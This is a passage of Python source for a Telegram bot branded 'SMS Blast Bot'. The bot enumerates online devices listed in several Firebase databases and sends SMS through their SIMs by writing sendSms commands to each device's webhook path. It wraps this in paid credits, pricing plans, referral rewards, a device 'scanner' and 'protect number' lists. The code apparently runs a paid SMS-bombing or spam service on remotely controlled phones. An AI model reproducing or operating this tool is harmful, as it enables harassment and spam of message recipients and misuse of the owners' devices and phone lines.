                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"], "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id, "dev_name": name, "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results


async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot, "to": to.strip(), "message": message.strip(),
            "isSended": False, "timestamp": int(time.time())
        }
    )


async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False


async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing


def force_join_text(missing: list) -> str:
    lines = [
        DIVIDER,
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    lines.append(DIVIDER)
    return "\n".join(lines)


def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")


def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"


def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    for fb_id, fb_data in fb_items[:5]:
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    if len(fb_items) > 5:
        fb_lines.append(f"  … +{len(fb_items) - 5} more Firebase DBs")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    protected_count = len(PROTECTED_NUMBERS)
    return (
        f"{DIVIDER}\n"
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"{DIVIDER}\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} ᴏᴡɴᴇʀs        : <b>1</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_STAR, '🖼')} ɪᴍᴀɢᴇs        : <b>{len(d.get('images', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"{DIVIDER}"
    )


def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    for fb_id, fb_data in fb_items[:5]:
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    if len(fb_items) > 5:
        fb_lines.append(f"  … +{len(fb_items) - 5} more Firebase DBs")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    protected_count = len(PROTECTED_NUMBERS)
    return (
        f"{DIVIDER}\n"
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"{DIVIDER}\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"{DIVIDER}"
    )


def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{DIVIDER}\n"
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}\n"
        f"{DIVIDER}"
    )


def analytics_dashboard_text(d: dict) -> str:
    now = int(time.time())
    users = d.get("users", {})
    total_users = len(users)
    total_credits = sum(max(0, int(user.get("credits", 0))) for user in users.values())
    active_sessions = sum(1 for session in USER_SESSIONS.values() if session.task and not session.task.done())
    history = d.get("sms_history", {})
    recent_logs = recent_sent = recent_failed = 0
    for entries in history.values():
        for entry in entries:
            if now - int(entry.get("timestamp", 0)) <= 86400:
                recent_logs += 1
                if entry.get("status") == "sent":
                    recent_sent += 1
                elif entry.get("status") in {"failed", "stopped"}:
                    recent_failed += 1
    stats = d.get("stats", {})
    return (
        f"{DIVIDER}\n📈 <b>{sc("analytics dashboard")}</b>\n{DIVIDER}\n\n"
        f"👥 <b>Total users:</b> <b>{total_users}</b>\n"
        f"💳 <b>Credits in circulation:</b> <b>{total_credits}</b>\n"
        f"⚡ <b>Active SMS sessions:</b> <b>{active_sessions}</b>\n"
        f"📋 <b>SMS logs (last 24h):</b> <b>{recent_logs}</b>\n"
        f"✅ <b>Sent (last 24h):</b> <b>{recent_sent}</b>\n"
        f"⚠️ <b>Failed/stopped (last 24h):</b> <b>{recent_failed}</b>\n\n"
        f"📤 <b>Total sent:</b> <b>{int(stats.get('total_sent', 0))}</b>\n"
        f"❌ <b>Total failed:</b> <b>{int(stats.get('total_failed', 0))}</b>\n"
        f"🕒 <i>Updated: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</i>\n{DIVIDER}"
    )


def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_text = "ᴅɪsᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ" if d.get("free_mode") else "ᴇɴᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ"
    mode_style = "danger" if d.get("free_mode") else "success"
    mode_emoji = EMOJI_CROSS if d.get("free_mode") else EMOJI_CHECK
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"),
         btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu", EMOJI_FIRE, "🔥", style="primary")],
        [btn("ᴅᴀsʜʙᴏᴀʀᴅ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "🖼", style="primary"),
         btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="success")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
         btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary"),
         btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="success")],
        [btn("ᴀɴᴀʟʏᴛɪᴄs", "owner:analytics", EMOJI_STAR, "📈", style="success")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜", style="primary"),
         btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="success")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"),
         btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰", style="danger"),
         btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰", style="danger"),
         btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"),
         btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="success")],
        [btn("sᴍs ʟᴏɢ ᴄʜᴀɴɴᴇʟ", "owner:sms_log", EMOJI_BELL, "📥", style="primary")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary"),
         btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒", style="danger")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"),
         btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊", style="success")],
        [btn(mode_text, "owner:free:off" if d.get("free_mode") else "owner:free:on", mode_emoji, "🔓", style=mode_style)],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="primary"),
         btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")],
    ])


def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="success"),
         btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
         btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary"),
         btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")],
    ])


def user_kb() -> InlineKeyboardMarkup:
    """User dashboard — sirf basic buttons, panel button nahi."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success"),
         btn("ᴘʀᴏғɪʟᴇ", "user:profile", EMOJI_STAR, "👤", style="primary")],
        [btn("ʀᴇғᴇʀ & ᴇᴀʀɴ", "user:refer", EMOJI_GIFT, "🎁", style="success"),
         btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎟", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛ", "user:pricing", EMOJI_MONEY, "💰", style="success"),
         btn("ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs", "user:premium", EMOJI_CROWN, "💎", style="primary")],
        [btn("sᴛᴀᴛᴜs", "user:stats", EMOJI_GEAR, "📊", style="primary"),
         btn("sᴜᴘᴘᴏʀᴛ", "user:support", EMOJI_BELL, "🆘", style="danger")],
        [btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜", style="primary"),
         btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="success")],
    ])


def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ / ɪᴍᴀɢᴇ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("🗑 ᴄʟᴇᴀʀ ᴀʟʟ ᴍᴇᴅɪᴀ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]
    ]
    for idx, vid in enumerate(videos, 1):
        rows.append([btn(f"ᴠɪᴅᴇᴏ #{idx}", "noop", EMOJI_VIDEO, "📹", style="primary"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑", style="danger")])
    for idx, image in enumerate(d.get("images", []), 1):
        rows.append([btn(f"ɪᴍᴀɢᴇ #{idx}", "noop", EMOJI_STAR, "🖼", style="primary"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:images:del:{idx-1}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    rows = [
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
         btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary")]
    ]
    for fb in fbs:
        label = fb.get("label", fb["url"][:28])
        rows.append([
            btn(label[:28], "noop", EMOJI_FIRE, "🔥", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}", EMOJI_CROSS, "🗑", style="danger")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn(f"{MAIN_OWNER} (ᴏᴡɴᴇʀ)", "noop", EMOJI_CROWN, "👑", style="success")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ])


def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ɴᴏ ᴀᴅᴍɪɴs", "noop", EMOJI_SHIELD, "🛡", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ])


def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")
    text = "\n".join(lines)
    rows = []
    if prefix == "owner":
        for uid_str, _ in chunk:
            rows.append([btn(f"💰 {uid_str}", f"owner:user:balance:{uid_str}", EMOJI_MONEY, "💰", style="primary")])
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav: rows.append(nav)
    if prefix == "owner":
        rows.append([btn("🔎 sᴇᴀʀᴄ ᴜsᴇʀ / ʙᴀʟᴀɴᴄᴇ", "owner:users:search", EMOJI_STAR, "🔎", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)


def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        DIVIDER,
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)


R = Router()


@R.errors()
async def global_error_handler(event: ErrorEvent):
    """Prevent one handler failure from stopping polling; log full traceback."""
    log.exception("Unhandled update error: %s", event.exception)
    try:
        update = event.update
        message = getattr(update, "message", None) or getattr(update, "callback_query", None)
        if message and hasattr(message, "answer"):
            await message.answer("⚠️ Temporary error aa gaya. Please dobara try karein.")
    except Exception:
        log.exception("Error while notifying user about handler failure")
    return True

# ============================================================
# START COMMANDS
# ============================================================

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(react_to_start(msg.bot, msg))
    await msg.answer("🎉")
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    d["users"].setdefault(str(uid), {})["username"] = username
    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass
        save(d)
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.",
            reply_markup=default_reply_keyboard(uid, d),
            parse_mode="HTML"
        )
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {OWNER_NAME}")
    await msg.answer(
        f"{DIVIDER}\n🎉 <b>{sc("welcome")}</b>\n{DIVIDER}\n"
        f"👤 <b>Role:</b> {role_tag(uid, d)}\n"
        f"💳 <b>Credits:</b> <b>{get_user_credits(uid, d)}</b>\n"
        f"📤 <b>Quota:</b> 1 credit = 10 SMS\n"
        f"👇 <i>Select an option below to continue.</i>\n{DIVIDER}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


@R.message(Command("balance"))
async def cmd_balance(msg: Message):
    d = load()
    uid = msg.from_user.id
    user = d.get("users", {}).get(str(uid), {})
    if not user:
        await msg.answer("Pehle /start karein, phir /balance use karein.")
        return
    await msg.answer(user_balance_text(uid, d), parse_mode="HTML")


@R.message(Command("redeem"))
async def cmd_redeem(msg: Message, state: FSMContext):
    await state.set_state(S.redeem_code)
    await msg.answer(
        f"{DIVIDER}\n🎁 <b>{sc("redeem center")}</b>\n{DIVIDER}\n"
        f"🔑 <b>Enter your redeem code below.</b>\n"
        f"🎟 Example: <code>GIFTABC123</code>\n"
        f"✅ Valid codes add credits instantly.\n{DIVIDER}",
        parse_mode="HTML"
    )


@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(react_to_start(msg.bot, msg))
    await msg.answer("🎉")
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    d["users"].setdefault(str(uid), {})["username"] = username
    save(d)
    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.",
